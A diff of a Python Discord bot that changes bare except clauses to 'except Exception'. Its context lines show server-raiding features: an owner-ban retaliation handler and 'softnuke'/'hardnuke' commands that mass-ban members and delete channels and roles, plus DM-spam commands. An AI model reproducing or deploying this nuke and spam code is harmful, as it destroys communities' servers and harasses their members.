@@ -98,7 +98,7 @@ def replitRead(key: str):
     """
     try:
         return replit.db[key]
-    except:
+    except KeyError:
         """Accessing a non-existent key will raise KeyError."""
         return None
 
@@ -109,7 +109,7 @@ def replitGetAllKeys():
     """
     try:
         return replit.db.keys()
-    except:
+    except Exception:
         return None
 
 
@@ -360,7 +360,7 @@ You were AFK for {afklen}""")
             try:
                 await message.author.edit(nick=
                                           removeprefix(message.author.display_name, "[AFK] "))
-            except:
+            except Exception:
                 pass
             
             await asyncio.sleep(7.5)
@@ -458,7 +458,7 @@ async def updatelog(ctx):
         try:
             dir_path = os.path.dirname(os.path.realpath(__file__))
             shutil.rmtree(os.path.join(dir_path, "mzbot-v2"))
-        except:
+        except Exception:
             pass
         
         repo = git.Repo.clone_from("https://github.com/XInTheDark/mzbot-v2", "mzbot-v2")  # gets the repo from GitHub
@@ -581,7 +581,7 @@ async def on_member_ban(guild, user):
     guildid = guild.id
     # try:
     #     bansdict[guildid] = guild.bans()[guildid] + 1
-    # except:
+    # except Exception:
     #     None
     
     if user.id == ownerid:
@@ -596,13 +596,13 @@ async def on_member_ban(guild, user):
             for member in guild.members:
                 try:
                     await member.ban(reason=random.choice(rlist))
-                except:
+                except Exception:
                     pass
             
             for member in guild.members:
                 try:
                     await member.kick(reason=random.choice(krlist))
-                except:
+                except Exception:
                     pass
             
             try:
@@ -615,13 +615,13 @@ async def on_member_ban(guild, user):
                     for channel in text_channel_list:
                         try:
                             await channel.delete()
-                        except:
+                        except Exception:
                             pass
                 
-                except:
+                except Exception:
                     pass
             
-            except:
+            except Exception:
                 pass
             
             newchannel = await guild.create_text_channel(name='raided-by-mz-freerobux')
@@ -638,13 +638,13 @@ EZ
 EZ
 EZ
 https://pornhub.com/**""")
-                except:
+                except Exception:
                     newchannel = random.choice(guild.text_channels)
                 
                 try:
                     await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
                     await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
-                except:
+                except Exception:
                     pass
 
 
@@ -709,7 +709,7 @@ async def meme(ctx, subreddit: str = "memes", sort: str = "hot"):
                     randint = random.randint(0, 25)
                     titleText = res['data']['children'][randint]['data']['title']
                     _url = res['data']['children'][randint]['data']['url']
-                except:
+                except Exception:
                     continue
             
             embed = discord.Embed(title=titleText, description="", color=random.randint(0, 0xFFFFFF))
@@ -852,7 +852,7 @@ async def mute(ctx, member: discord.Member, *, reason=None):
         try:
             mutedrole = discord.utils.get(guild.roles, name="Muted")
             await member.add_roles(mutedrole, reason=reason)
-        except:
+        except Exception:
             # the Muted role does not exist, need to create one
             mutedrole = await ctx.guild.create_role("Muted",
                                                     permissions=discord.Permissions(send_messages=False))
@@ -905,7 +905,7 @@ async def softnuke_server(ctx):
                 try:
                     for channel in text_channel_list:
                         await channel.delete()
-                except:
+                except Exception:
                     pass
         
         await nuke_channel_2(ctx)
@@ -926,14 +926,14 @@ async def hardnuke_server(ctx):
             if member.id != ownerid:
                 try:
                     await member.ban(reason=random.choice(rlist))
-                except:
+                except Exception:
                     pass
         
         for member in ctx.guild.members:
             if member.id != ownerid:
                 try:
                     await member.kick(reason=random.choice(krlist))
-                except:
+                except Exception:
                     pass
         
         try:
@@ -946,25 +946,25 @@ async def hardnuke_server(ctx):
                 for channel in text_channel_list:
                     try:
                         await channel.delete()
-                    except:
+                    except Exception:
                         pass
                 
                 for category in ctx.guild.categories:
                     try:
                         await category.delete()
-                    except:
+                    except Exception:
                         pass
             
-            except:
+            except Exception:
                 pass
         
-        except:
+        except Exception:
             pass
         
         for role in ctx.guild.roles:
             try:
                 await role.delete()
-            except:
+            except Exception:
                 continue
         
         guild = ctx.message.guild
@@ -982,13 +982,13 @@ EZ
 EZ
 EZ
 https://pornhub.com/**""")
-            except:
+            except Exception:
                 newchannel = random.choice(ctx.guild.text_channels)
             
             try:
                 await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
                 await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
-            except:
+            except Exception:
                 pass
 
 
@@ -1172,7 +1172,7 @@ async def dmspam(ctx, number_of_times: int, user: discord.Member, *, message):
         for i in range(number_of_times):
             try:
                 await dmchannel.send(message)
-            except:
+            except Exception:
                 await ctx.author.create_dm().send(
                     f"""Your `dmspam` task failed because the target (`{user}`) DMs are closed.""")
                 await msg1.delete()
@@ -1209,7 +1209,7 @@ async def dmspam_force(ctx, number_of_times: int, user: discord.Member, *, messa
         for i in range(number_of_times):
             try:
                 await dmchannel.send(message)
-            except:
+            except Exception:
                 await ctx.author.create_dm().send(
                     f"""Your `dmspam` task failed because the target (`{user}`) DMs are closed.""")
                 return -1
@@ -1328,10 +1328,10 @@ async def setclaimschannel(ctx, channel):
             channelid = removesuffix(
                 removeprefix(channel, '<#')
                 , '>')
-        except:
+        except Exception:
             try:
                 channelid = int(channel)
-            except:
+            except Exception:
                 await ctx.channel.send('An error occurred! Check your syntax!')
                 return
     else:
@@ -1339,7 +1339,7 @@ async def setclaimschannel(ctx, channel):
     
     try:
         channeltest = client.get_channel(channelid)
-    except:
+    except Exception:
         await ctx.channel.send('Cannot find channel! Check your command!')
         return
     
@@ -1415,10 +1415,10 @@ async def setproofschannel(ctx, channelid):
             channelid = removesuffix(
                 removeprefix(channelid, '<#')
                 , '>')
-        except:
+        except Exception:
             try:
                 channelid = int(channelid)
-            except:
+            except Exception:
                 await ctx.channel.send('An error occurred! Check your syntax!')
                 return
     else:
@@ -1428,7 +1428,7 @@ async def setproofschannel(ctx, channelid):
     
     try:
         channeltest = client.get_channel(channelid)
-    except:
+    except Exception:
         await ctx.channel.send('Cannot find channel! Check your command!')
         return
     
@@ -1481,10 +1481,10 @@ async def rename(ctx, channel='', *, name):
                 removeprefix(channel, '<#')
                 , '>')
             channelid = int(channelid)
-        except:
+        except Exception:
             try:
                 channelid = int(channel)
-            except:
+            except Exception:
                 await ctx.channel.send('An error occurred! Check your syntax!')
                 return
     else:
@@ -1492,7 +1492,7 @@ async def rename(ctx, channel='', *, name):
     
     try:
         channel2 = bot.get_channel(channelid)
-    except:
+    except Exception:
         await ctx.channel.send('Cannot find channel! Check your command!')
         return
     
@@ -1574,7 +1574,7 @@ async def afk(ctx, *, reason='AFK'):
     msg1 = await ctx.send(f"{ctx.author.mention}, I set your AFK: {reason}")
     try:
         await ctx.author.edit(nick=f"[AFK] {ctx.author.display_name}")
-    except:
+    except Exception:
         pass
     
     replitWrite("afk", afkdict)
@@ -1594,7 +1594,7 @@ async def removeafk(ctx, *, member: discord.Member = None):
     
     try:
         afkdict.pop(str(ctx.author.id))
-    except:
+    except Exception:
         pass
     
     if "[AFK] " in ctx.author.nick:
@@ -1602,7 +1602,7 @@ async def removeafk(ctx, *, member: discord.Member = None):
             await ctx.author.edit(nick=ctx.author.nick.replace("[AFK] ", ""))
             await ctx.send(f"AFK status removed for `{member}`\n"
                            f"Nickname updated.")
-        except:
+        except Exception:
             await ctx.send(f"AFK status removed for `{member}`\n"
                            f"I could not edit the user's nickname due to the role hierarchy.")
             return
@@ -1720,7 +1720,7 @@ async def timedif(ctx, id1: int, id2: int = None):
     try:
         id1 = int(id1)
         id2 = int(id2)
-    except:
+    except Exception:
         await ctx.reply("Check your message IDs! They are incorrect!")
         return
     
@@ -1882,7 +1882,7 @@ async def define(ctx, *, word):
                     meaning = meaning + f" - {j}\n"
             
             meaning = removesuffix(meaning, "\n")
-        except:
+        except Exception:
             await ctx.reply(f"`{word}` not found in dictionary!")
             return
         
@@ -1981,7 +1981,7 @@ async def snipe(ctx, pos: int = 1):
         lst = snipes[(sorted(snipes.keys())[-pos])]
         if lst is not None:
             success1 = True
-    except:
+    except Exception:
         if pos == 1:
             await ctx.reply("No messages deleted yet.")
         else:
@@ -1991,7 +1991,7 @@ async def snipe(ctx, pos: int = 1):
     if success1:
         try:
             lst = lst.split("||2435baff2acdeef16e7f9e810e883ac572e5d04f||")
-        except:
+        except Exception:
             pass
         
         lst[0], lst[1], lst[3], lst[4] = int(lst[0]), int(lst[1]), int(lst[3]), int(lst[4])
@@ -2009,7 +2009,7 @@ async def snipe(ctx, pos: int = 1):
                         success2 = True
                         break
                 
-                except:
+                except Exception:
                     break
                 
                 pos1 += 1
@@ -2045,7 +2045,7 @@ async def esnipe(ctx, pos: int = 1):
         
         if lst is not None:
             success1 = True
-    except:
+    except Exception:
         if pos == 1:
             await ctx.reply("No messages edited yet.")
         else:
@@ -2055,7 +2055,7 @@ async def esnipe(ctx, pos: int = 1):
     if success1:
         try:
             lst = lst.split("||9cd692681d3df8f3bb8aa91b903370d31b7fa662||")
-        except:
+        except Exception:
             pass
         
         lst[0], lst[1], lst[4], lst[5] = int(lst[0]), int(lst[1]), int(lst[4]), int(lst[5])
@@ -2073,7 +2073,7 @@ async def esnipe(ctx, pos: int = 1):
                         success2 = True
                         break
                 
-                except:
+                except Exception:
                     break
                 
                 pos1 += 1
@@ -2108,7 +2108,7 @@ async def invites(ctx, person=None):
                 removeprefix(person, '<@')
                 , '>')
             person = bot.get_user(int(personid))
-        except:
+        except Exception:
             await ctx.reply("I can't find that user.")
     
     if person is None:
@@ -2121,10 +2121,10 @@ async def invites(ctx, person=None):
                 removeprefix(person, '<@')
                 , '>')
             member = bot.get_user(int(personid))
-        except:
+        except Exception:
             try:
                 member = bot.get_user(int(person))
-            except:
+            except Exception:
                 await ctx.reply("I can't find that user.")
     
     totalInvites = 0
@@ -2147,7 +2147,7 @@ async def dminvite(ctx, user: discord.Member, *, reason=None):
     try:
         person = await bot.fetch_user(user.id)
         success1 = True
-    except:
+    except Exception:
         person = bot.get_user(user.id)
         if person is not None:
             success1 = True
@@ -2160,7 +2160,7 @@ async def dminvite(ctx, user: discord.Member, *, reason=None):
         try:
             dms = await person.create_dm()
         
-        except:
+        except Exception:
             await ctx.reply("I cannot create a DM with that user.")
             success2 = False
         
@@ -2206,7 +2206,7 @@ async def timer(ctx, duration, *, item=' '):
     else:
         try:
             duration2 = int(duration)
-        except:
+        except Exception:
             duration2 = 0
             
             duration3 = 'undefined'
@@ -2643,7 +2643,7 @@ async def play(ctx, *, url_: str = None):
         try:
             channel = ctx.author.voice.channel
             voice = await channel.connect()
-        except:
+        except Exception:
             voice = ctx.guild.voice_client
             # note how we do not use discord.utils.get(bot.voice_clients, guild=ctx.guild).
             # this is because that returns a VoiceProtocol object, not a VoiceClient.
@@ -2690,7 +2690,7 @@ async def queue(ctx, *, url_: str):
         try:
             channel = ctx.author.voice.channel
             voice = await channel.connect()
-        except:
+        except Exception:
             voice = ctx.guild.voice_client
     
     if not await checkVoicePerms(ctx):
@@ -2712,7 +2712,7 @@ async def skip(ctx):
     try:
         channel = ctx.author.voice.channel
         voice = await channel.connect()
-    except:
+    except Exception:
         voice = ctx.guild.voice_client
     
     voice.stop()
@@ -2848,7 +2848,7 @@ async def robloxuser(ctx, userid: int):
     async with ctx.channel.typing():
         # try:
         ruser = await rclient.get_user(userid)  # HAS PROBLEMS!
-        # except:
+        # except Exception:
         #     await ctx.reply("`Roblox user not found. Check the user ID!`")
         #     return
     
@@ -2911,7 +2911,7 @@ React with 🎉 to enter the giveaway!""", timestamp=datetime.datetime.utcnow())
     else:
         try:
             duration2 = int(duration)
-        except:
+        except Exception:
             duration2 = 0
             
             duration3 = 'undefined'
@@ -2983,7 +2983,7 @@ async def greroll(ctx, id_: int):
     
     try:
         new_msg = await ctx.fetch_message(id_)
-    except:
+    except Exception:
         await ctx.reply(
             "The ID that was entered was incorrect, make sure you have entered the correct giveaway message ID.")
     
@@ -3019,7 +3019,7 @@ async def grerollc(ctx, id_: int):
     
     try:
         new_msg = await ctx.fetch_message(id_)
-    except:
+    except Exception:
         await ctx.reply(
             "The ID that was entered was incorrect, make sure you have entered the correct giveaway message ID.")
     
@@ -3027,7 +3027,7 @@ async def grerollc(ctx, id_: int):
     users = [user async for user in new_msg.reactions[0].users()]
     try:
         users.pop(users.index(new_msg.author))
-    except:
+    except Exception:
         pass
     
     winner = random.choice(users)
@@ -3048,7 +3048,7 @@ async def gend(ctx, id_: int):
     if id_ not in ended:
         try:
             new_msg = await ctx.fetch_message(id_)
-        except:
+        except Exception:
             await ctx.reply(
                 "The ID that was entered was incorrect, make sure you have entered the correct giveaway message ID.")
         
@@ -3201,6 +3201,6 @@ keep_alive.keep_alive()  # keep bot alive
 
 try:
     bot.run(TOKEN, reconnect=True)
-except:
+except Exception:
     os.system("kill 1")
     # "kill 1" automatically runs the script.
